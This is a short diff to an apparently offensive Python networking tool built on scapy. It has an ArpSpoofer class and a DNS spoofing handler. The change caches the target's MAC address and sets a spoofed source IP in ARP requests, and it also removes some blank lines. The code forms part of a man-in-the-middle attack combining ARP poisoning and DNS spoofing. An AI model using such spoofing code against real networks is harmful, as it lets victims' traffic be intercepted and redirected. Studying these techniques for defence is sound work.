@@ -50,7 +50,8 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        arp_request = ARP(pdst=self.target_ip)
+        if self.target_mac is not None: return self.target_mac
+        arp_request = ARP(pdst=self.target_ip, psrc=self.spoof_ip)
         broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
         arp_request_broadcast = broadcast / arp_request
         answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
@@ -123,10 +124,6 @@ class DnsHandler(object):
 
         self.spoof_dict = spoof_dict
         self.real_dns_server_ip = REAL_DNS_SERVER_IP
-    
-
-
-
 
     def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
         """
